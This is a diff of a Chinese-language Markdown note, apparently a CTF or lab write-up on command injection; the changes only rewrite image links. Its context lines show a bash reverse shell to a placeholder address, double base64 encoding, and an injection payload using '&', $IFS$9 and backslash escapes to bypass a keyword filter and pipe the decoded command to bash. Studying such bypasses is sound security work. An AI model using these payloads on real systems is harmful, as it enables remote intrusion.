@@ -1,6 +1,6 @@
-![[Pasted image 20230125095243.png|500]]
+![](<./img/Pasted image 20230125095243.png>)
 
-![[Pasted image 20230125095259.png|500]]
+![](<./img/Pasted image 20230125095259.png>)
 
 尝试输入正常ip
 
@@ -61,7 +61,7 @@ bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"
 echo 'bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"' | base64
 ```
 
-![[Pasted image 20230125101455.png|1000]]
+![](<./img/Pasted image 20230125101455.png>)
 
 编码结果里面出现了加号，依然绕不过，因而尝试二次编码
 
@@ -69,7 +69,7 @@ echo 'bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"' | base64
 echo 'bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"' | base64 | base64
 ```
 
-![[Pasted image 20230125101701.png|1000]]
+![](<./img/Pasted image 20230125101701.png>)
 
 这下没有了，但是非常脸黑地编码结果中刚好有被过滤的单词，懒得一个一个找直接一锅端了
 
@@ -77,6 +77,6 @@ echo 'bash -c "bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1"' | base64 | base64
 a&ec\ho$IFS$9\W\W\1\G\e\m...\Q\z\h\5\T\X\p\N\e\k\l\E\Q\S\t\K\a\k\V\p\Q\2\c\9\P\Q\o\=|base64$IFS$9-d|base64$IFS$9-d|bas\h
 ```
 
-![[Pasted image 20230125102444.png|1000]]
+![](<./img/Pasted image 20230125102444.png>)
 
 #Web #RCE #反弹shell #绕过 #shell 
